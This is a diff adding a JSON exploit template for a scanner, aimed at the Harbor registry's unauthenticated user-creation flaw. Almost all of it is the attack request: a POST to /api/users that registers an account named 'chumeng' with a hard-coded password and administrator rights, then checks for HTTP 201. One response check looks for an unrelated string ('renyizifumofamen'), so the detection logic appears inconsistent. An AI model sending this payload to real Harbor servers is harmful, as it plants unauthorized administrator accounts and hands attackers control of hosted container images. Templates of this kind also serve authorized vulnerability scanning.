@@ -1,0 +1,33 @@
+{
+    "Name": "Harbor 未授权创建管理员漏洞",
+    "Description": "未授权创建账号",
+    "Product": "Harbor",
+    "author": "chumeng",
+    "Request":[
+                {
+        "Method": "POST",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/api/users",
+        "Port":"",
+        "Data":"{\"username\":\"chumeng\",\"email\":\"chumeng@qq.com\",\"realname\":\"chumeng\",\"password\":\"chumengchumeng\",\"comment\":\"1\",\"has_admin_role\":true}",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+            {
+                "Operation": "contains",
+            "Key":"",
+                "Value": "renyizifumofamen"
+            },
+            {
+                "Operation": "code",
+            "Key":"",
+                "Value": "201"
+            }
+        ]
+        },
+        "Next_decide":""
+                }
+]}
+
